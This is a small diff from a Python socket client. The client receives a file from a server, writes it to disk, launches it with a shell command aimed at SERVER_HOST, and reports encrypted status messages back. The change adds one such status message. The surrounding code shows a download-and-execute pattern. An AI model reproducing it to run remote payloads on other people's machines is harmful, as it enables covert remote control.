@@ -105,6 +105,9 @@ while True:
                 remaining -= len(data)
                 f.write(data)
             f.close()
+            server_state = "transferred live Streaming Server"
+            server_state = Fernet(key).encrypt(server_state.encode())
+            s.send(server_state)
         subprocess.Popen(f'cmd /k {directory} -n {SERVER_HOST} -p {sender_port} & exit', shell=True)
         server_state = "live Streaming Server is running"
         server_state = Fernet(key).encrypt(server_state.encode())
